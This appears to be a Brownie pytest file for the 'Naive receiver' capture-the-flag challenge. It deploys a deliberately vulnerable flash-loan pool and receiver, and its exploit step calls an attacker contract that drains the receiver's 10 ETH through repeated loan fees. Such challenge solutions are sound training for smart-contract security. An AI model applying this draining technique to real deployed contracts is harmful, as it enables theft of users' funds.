import pytest
import brownie
from brownie import NaiveReceiverLenderPool, FlashLoanReceiver, AttackNaiveReceiver
from brownie import accounts , Wei , exceptions

print("[Challenge] Naive receiver : \n")

deployer, user, attacker = None, None, None

# Pool has 1000 ETH in balance
ETHER_IN_POOL = Wei('1000 ether') 

# Receiver has 10 ETH in balance
ETHER_IN_RECEIVER = Wei('10 ether')

@pytest.fixture(scope="module")
def contracts():
    #-- SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE --#
    global deployer, attacker, someUser 
    deployer, attacker, someUser = accounts[0] ,accounts[1] ,accounts[2]

    contracts = {}

    pool = NaiveReceiverLenderPool.deploy( {"from":deployer} )
    receiver =  FlashLoanReceiver.deploy( pool.address, {"from":deployer} )
    attackNaiveReceiver = AttackNaiveReceiver.deploy(pool.address, {"from":attacker} )

    # Funding Pool and receiver contracts with initial Ether
    deployer.transfer(to=pool, amount=ETHER_IN_POOL)
    deployer.transfer(to=receiver, amount=ETHER_IN_RECEIVER)

    assert pool.balance() == ETHER_IN_POOL
    assert receiver.balance() == ETHER_IN_RECEIVER
    assert pool.fixedFee() == Wei('1 ether')

    contracts['receiver'] = receiver
    contracts['pool'] = pool
    contracts['attackNaiveReceiver'] = attackNaiveReceiver

    yield contracts

    #---------** SUCCESS CONDITIONS **---------#
    # All ETH has been drained from the receiver

    assert contracts['receiver'].balance() == Wei('0')
    assert contracts['pool'].balance() == (ETHER_IN_POOL + ETHER_IN_RECEIVER) 
    
def test_naive_receiver_challenge(contracts):
    #--*** CODE YOUR EXPLOIT HERE ***--#
    contracts['attackNaiveReceiver'].attackReceiver(contracts['receiver'].address, Wei('10'), 10, {'from':attacker})
    #_________________________________#